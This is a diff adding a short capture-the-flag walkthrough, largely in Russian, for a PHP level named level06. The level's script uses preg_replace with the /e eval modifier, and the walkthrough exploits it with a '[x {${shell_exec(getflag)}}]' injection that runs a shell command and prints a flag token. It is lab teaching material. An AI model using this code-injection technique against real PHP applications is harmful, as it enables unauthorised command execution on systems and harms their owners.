@@ -1,0 +1,25 @@
+очевидно катаем .php файл
+
+cat level06.php
+
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+Видим что вызывается функция x, которая принимает два аргумента, первый параметр скорее всего имя файла
+В функции Х юзается preg_replace с модификатором регулярного выражения 'e'(PREG_REPLACE_EVAL)
+если матчится то он исполняется как PHP код, через него мы можем внедрить то что нам нужно
+
+
+(\[x (.*)\]) - вот так выглядит наш regexp, что бы запарситься под него нам надо скормить в .php что то а-ля: [x fooBar]
+то что идет после x (.*) как раз и улетает в функцию Y
+
+the second capture group is (.*) and that what's given to the y function
+
+echo '[x {${shell_exec(getflag)}}]' > /tmp/getMyFlag 
+./level06 /tmp/getMyFlag
+
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
